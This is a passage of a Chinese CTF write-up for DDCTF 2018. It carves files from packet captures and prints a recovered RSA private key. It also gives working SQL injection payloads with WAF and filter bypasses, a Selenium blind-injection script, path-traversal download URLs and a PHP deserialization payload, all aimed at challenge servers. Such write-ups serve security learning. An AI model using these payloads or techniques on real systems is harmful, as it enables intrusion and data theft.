ftp-data\n\n得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"flag.pcap\")\n\nfp = open(\"flag.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。\n\n## ftp之sqlmap.zip\n> tcp.stream eq 2005\n\n既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:\n> tcp.stream eq 2004 && ftp-data\n\n得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。\n\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"sqlmap.pcap\")\n\nfp = open(\"sqlmap.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n\n得到了一个sqlmap.zip，第一次打开，用winrar，点击工具->修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。\n\n已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。\n\n然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。\n\n## 邮件部分\n通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:\n\n```\nContent-type: image/png; name=\"image001.png\";\n x-mac-creator=\"4F50494D\";\n x-mac-type=\"504E4766\"\nContent-ID: <image001.png@01D38B05.8079CE40>\nContent-disposition: inline;\n\tfilename=\"image001.png\"\nContent-transfer-encoding: base64\n```\n\n下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。\n\n```\nimport base64\n\nfp = open(\"1.txt\", \"r\")\nfp1 = open(\"file.png\", \"wb\")\n\nfp1.write(base64.b64decode(fp.read()))\n```\n\n然后，就可以得到一个file.png。\n\n![avatar](/assets/ddctf/20180425151942.png)\n\n然后，就是将图片中的字符串提取出来。\n\n```\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n```\n\n再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。\n\n一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。\n\n## 得到flag\n今天是ddctf最后一天，\"喝杯java\"，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。\n\nrsa密钥也就是，保存一下就行了:\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n```\n\n\n![avatar](/assets/ddctf/20180420184445.png)\n\n然后，查看http包，flag就出来了。\n\n![avatar](/assets/ddctf/20180420183706.png)\n\n# 数据库的秘密\n## X-forwarded-for\n首先打开网页，可以看到\"非法链接，只允许来自 123.232.23.245 的访问\",很容易就想到修改X-forwarded-for, Chrome下我使用[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件,然后修改一下X-forwarded-for就行了\n## 寻找注入点\n既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。\n\n* id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。\n* title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。\n* author\n  * \"admin\", 会得到author 为 \"admin\" 的两条记录\n  * \"admin'\", 一条记录都没有\n  * \"admin'#\", 同样会得到author 为 \"admin\" 的两条记录，那注入点应该就是这里了。\n  * \"admin' and 1=1#\", 发现会有网站防火墙拦截，应该是\"and\"被拦截，可以使用\"&&\"来替换\"and\",然后，同样会查询出两条记录。\n\n## 注入 \n找到注入点之后，就好办了。\n\n* \"admin' order by 6#\", 失败，\"admin' order by 5#\"，成功查询，那就是5列了。 \n* \"admin' union select 1,2,3,4,5#\", 被防火墙拦截，然后就是各种测试\"union select\",没能成功绕过(比赛结束之后，有师傅说可以绕过，[链接](https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md)，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。\n* \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)<'z')#\",成功拿到数据，接下来就是写脚本拿flag了。\n  脚本如下:\n\n```\nimport time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = \",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}\"\nurl=\"http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php\"\npath=\"D:\\\\python\\\\chromedriver.exe\"\ndriver = webdriver.Chrome(executable_path=path)\npayload = \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s')#\"\npayload_table = \"admin' && 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%d,1)='%s')#\"\npayload_column = \"admin' && 1=(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key7'),%d,1)='%s')#\"\npayload_value = \"admin' && 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord('%s'))#\"\n\ndef inject():\n    data = \"\"\n\n    driver.get(url)\n    input(\"jixu:\")\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script('document.getElementById(\"author\").type=\"text\"')\n            driver.find_element_by_id(\"author\").send_keys(payload_temp)\n            driver.find_element_by_id(\"button\").click()\n            if \"admin\" in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n\t\t\tjudge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n```\n\n## 注意点\n* 每次请求时，js都会计算一个sig值和time值，计算方法在main.js中\n\n   ```js\n   eval(function(p,a,c,k,e,d){e=function(c){return(ca?\"\":e(parseInt(c/a)))+((c=c%a)35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('e f(0,4){5 7='';l(i m 0){n(i!='c'){a='';a=i+'='+0[i];7+=a}}o k(7+4)};5 0={8:'',9:'',b:'',6:'',d:h(j v().u()/w)};e x(){0['8']=1.2('8').3;0['9']=1.2('9').3;0['b']=1.2('b').3;0['6']=1.2('6').3;5 c=f(0,4);1.2('g').q=\"p.s?r=\"+c+\"&d=\"+0.d;1.2('g').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{})) \n   ```\n\n   看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。\n\n* 由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:\n\n   ```\n   driver.get(url)\n   input(\"jixu:\")\n   ```\n\n   首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。\n\n# 专属链接\n## 任意文件下载\n首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,\"ZmF2aWNvbi5pY28=\",base64_encode之后就是\"favicon.ico\",图片的内容如下:\"you can only download .class .xml .ico .ks files\",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。\n\n![avatar](/assets/ddctf/20180421191033.png)\n\n其中需要注意的有三个文件，\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造\"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/assets/ddctf/201804211191034.png)\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造\"116.85.48.102:5050/image/banner/[随便一个错误的地址]\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/assets/ddctf/20180421191037.png)\n\n* _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过\"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')\",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。\n\n## 审计代码\n\n下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。\n其中最重要的两个文件是FlagController.class和InitListener.class。\n\n* FlagController.class\n\n```\npublic String getFlag(@PathVariable(\"email\") String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return \"Encrypted flag : \" + flag.getFlag();\n    }\n```\n在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。\n\n* InitListener.class\n\n```\npublic void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(\"regenflag\");\n                if(regenflag != null && \"false\".equals(regenflag)) {\n                    System.out.println(\"skip gen flag\");\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/emails.txt\");\n                        String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\");\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), \"utf-8\");\n                        String[] emails = emailsString.trim().split(\"\\n\");\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(\"www.didichuxing.com\", this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n                        Mac mac = Mac.getInstance(\"HmacSHA256\");\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 < var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = \"DDCTF{\" + Math.abs(sr.nextLong()) + \"}\";\n                            String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\");\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + \"同学的入口链接为：http://116.85.48.102:5050/welcom/\" + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n```\n该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。\n\n## 获取flag\n* 生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。\n\n```\npublic class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null && n < b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] & 255);\n            if(stmp.length() == 1) {\n                hs.append('0');\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(\"\")) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i < length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) \"0123456789ABCDEF\".indexOf(c);\n    }\n}\n```\n通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。\n\n```\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n```\n拿到该加密后的邮箱，就可以获得加密后的flag。\n\n ![avatar](/assets/ddctf/20180421191047.png)\n\n拿到加密之后的flag之后，就可以解密了。\n\n```\npublic static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n```\n该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可\n\n```\nString ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n```\n然后就可以解密得到flag.\n> DDCTF{5218295657878818503}\n\n# 注入的奥妙\n## sql注入\n首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号\"‘\"，发现输出竟然乱码。\n\n ![avatar](/assets/ddctf/20180421195946.png)\n\n 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。\n\n ![avatar](/assets/ddctf/20180421200130.png)\n\n 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\n\n ![avatar](/assets/ddctf/20180421200307.png)\n\n 我选择了\"么\"\n\n ![avatar](/assets/ddctf/20180421200748.png)\n\n通过测`http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88`，可以看到单引号成功逃逸。\n\n```\n 最后拼接的参数是 : ?\\\\'\n~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\\\''' at line 1\n```\n单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加\"collate utf8_general_cli\",强制转换编码即可。\n\n* 获取数据库。\n\n   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  `\n\n   得到结果\"sqli\"\n\n* 获取'sqli'下的table。\n\n   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23 `\n   得到结果\"message,route_rules\"\n\n* 获取\"route_rules\"的列名。\n\n* `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23` \n   得到结果\"id,pattern,action,rulepass\"\n\n* 然后获取route_rules表中的数据。\n   数据如下:  \n   1   get*/   u/well/getmessage/   \n   12  get*/   u/justtry/self/  \n   13  post*/  u/justtry/try  \n   15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip\n\n## 代码审计\n通过上边的`116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css`，可以拿到代码。\n\n+ Jusstry.php\n\n```\npublic function try($serialize)\n{\n    unserialize(urldecode($serialize), [\"allowed_classes\" => [\"Index\\Helper\\Flag\", \"Index\\Helper\\SQL\",\"Index\\Helper\\Test\"]]);\n}\n```\n通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。\n\n+ Flag.php\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this->sql->FlagGet($user);\n        if ($tmp['status']===1) {\n            return $this->sql->FlagGet($user)['flag'];\n        }\n    }\n}\n\n```\n该类说明只要调用get方法就可以得到指定用户的flag。\n\n+ Test.php\n\n```\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this->getflag('ctfuser', $this->user_uuid);\n    }\n\n    public function setflag($m = 'ctfuser', $u = 'default', $o = 'default')\n    {\n        $user=array(\n            'name' => $m,\n            'oldid' => $o,\n            'id' => $u\n        );\n        // var_dump($user);\n\n        echo $this->fl->set($user, 2);\n    }\n\n    public function getflag($m = 'ctfuser', $u = 'default')\n    {\n        //TODO: check username\n        $user=array(\n            'name' => $m,\n            'id' => $u\n        );\n        //懒了直接输出给你们了\n        echo 'DDCTF{'.$this->fl->get($user).'}';\n    }\n}\n```\n在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\"，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。\n\n```\n<?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this->sql=new SQL();\n    }\n}\n\n\n// defined('ACCESS_FILE') or exit('No direct script access allowed');\nclass Test\n{\n\n    public $user_uuid = \"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";\n    public $fl;\n\n    public function __construct()\n    {\n        echo 'hhkjjhkhjkhjkhkjhkhkhk';\n        $this->fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this->getflag('ctfuser', $this->user_uuid);\n    }\n}\n\necho serialize(new Test());\n```\n即可得到序列化之后的值:\"hhkjjhkhjkhjkhkjhkhkhkO:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4f5aa917-e388-4aa5-bcdc-125b9b95e12a\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}}\",然后就可以得到flag了。\n\n ![avatar](/assets/ddctf/20180421150038.png)\n\n# mini blockchain\n## 构造符合条件的区块\n```\nimport json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = '0' * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'],\n                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n\nblock = {\n    \"nonce\": \"6h0F\",\n    \"prev\": \"0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8\",\n    \"transactions\": []\n  }\n\nc = string.ascii_lowercase + \"0123456789ABCDEFGHI\"\n\ncaptchas = [''.join(i) for i in product(c, repeat=4)]\n\nprint('[+] Genering {} captchas...'.format(len(captchas)))\nwith open('captchas.txt', 'w') as f:\n    for k in captchas:\n        block[\"nonce\"] = k\n        f.write(hash_block(block)[:5] + ' --> ' + k + '\\n')\n```\n\"nonce\"值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。\n\n## 解题\n初始区块链如图所示:\n\n 